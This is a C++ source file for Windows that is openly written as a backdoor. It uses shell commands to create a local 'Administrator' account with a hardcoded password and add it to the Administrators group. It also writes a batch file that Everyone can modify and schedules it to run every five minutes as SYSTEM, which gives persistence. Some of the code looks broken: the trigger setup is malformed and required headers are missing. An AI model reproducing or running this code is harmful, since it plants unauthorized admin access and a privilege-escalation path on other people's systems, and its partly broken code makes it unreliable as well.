#include <iostream>
#include <fstream>
#include <cstdlib>
#include <Windows.h>
#include <Lmcons.h>
#pragma comment(lib, "Advapi32.lib")

using namespace std;

int main() {
    // Create a new user with administrative privileges
    system("net user Administrator mypassword /add");
    system("net localgroup Administrators Administrator /add");

    // Give the backdoor access to all users
    ofstream fout("C:\\Users\\Public\\backdoor.bat");
    fout << "echo Access granted >> C:\\Users\\Public\\access.txt";
    fout.close();

    system("icacls C:\\Users\\Public\\backdoor.bat /grant:r \"Everyone:(F)\"");

    // Create a scheduled task to run the backdoor.bat file every 5 minutes
    WCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    wstring task_name = L"BackdoorTask_" + wstring(username);

    wstring command = L"C:\\Windows\\System32\\cmd.exe /C C:\\Users\\Public\\backdoor.bat";
    wstring arguments = L"";
    wstring user_name = L"SYSTEM";

    // Create a task trigger that runs every 5 minutes
    TASK_TRIGGER trigger = { 0 };
    trigger.cbTriggerSize = sizeof(TASK_TRIGGER);
    trigger.wBeginDay = 0;
    trigger.wBeginMonth = 0;
    trigger.wBeginYear = 0;
    trigger.wStartHour = 0;
    trigger.MinutesInterval = 5;

    // Create a new scheduled task
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        ITaskScheduler *pITS = NULL;
        hr = CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (void **)&pITS);
        if (SUCCEEDED(hr)) {
            ITask *pITask = NULL;
            hr = pITS->NewWorkItem(task_name.c_str(), CLSID_CTask, IID_ITask, (IUnknown **)&pITask);
            if (SUCCEEDED(hr)) {
                pITask->SetCreator(user_name.c_str());
                pITask->SetApplicationName(command.c_str());
                pITask->SetParameters(arguments.c_str());
                pITask->SetTrigger(&trigger);

                SYSTEMTIME start_time;
                GetSystemTime(&start_time);
                start_time.wHour = 0;
                start_time.wMinute = 0;
                start_time.wSecond = 0;
                start_time.wMilliseconds = 0;

                pITask->SetAccountInformation(user_name.c_str(), NULL);

                ITaskTrigger *pTrigger = NULL;
                hr = pITask->CreateTrigger(&pTrigger);
                if (SUCCEEDED(hr)) {
                    pTrigger->SetTrigger(&trigger);
                    pTrigger->Release();
                }

                pITS->AddWorkItem(task_name.c_str(), pITask);
                pITask->Release();
            }

            pITS->Release();
        }

        CoUninitialize();
    }

    return 0;
}
